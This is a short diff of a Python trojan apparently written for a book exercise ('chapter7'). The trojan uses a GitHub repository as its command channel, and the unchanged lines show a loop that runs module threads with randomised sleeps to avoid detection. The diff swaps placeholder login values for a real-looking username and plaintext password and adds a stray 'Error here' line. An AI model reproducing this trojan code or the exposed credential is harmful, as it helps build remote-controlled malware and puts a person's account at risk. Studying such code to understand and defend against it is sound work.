@@ -16,11 +16,11 @@ trojan_modules = []
 configured = False
 task_queue = queue.Queue()
 
-
+''' Error here '''
 def connect_to_github():
-    gh = login(username="yourusername", password="yourpassword")
-    repo = gh.repository("yourusername", "chapter7")
-    branch = repo.branch("master")
+    gh = login(username="ragain", password="QwEr@2405")
+    repo = gh.repository("ragain", "chapter7")
+    branch = repo.branch("main")
     return gh, repo, branch
 
 
@@ -93,4 +93,3 @@ while True:
             t.start()
             time.sleep(random.randint(1, 10))
     time.sleep(random.randint(1000, 10000))
-    
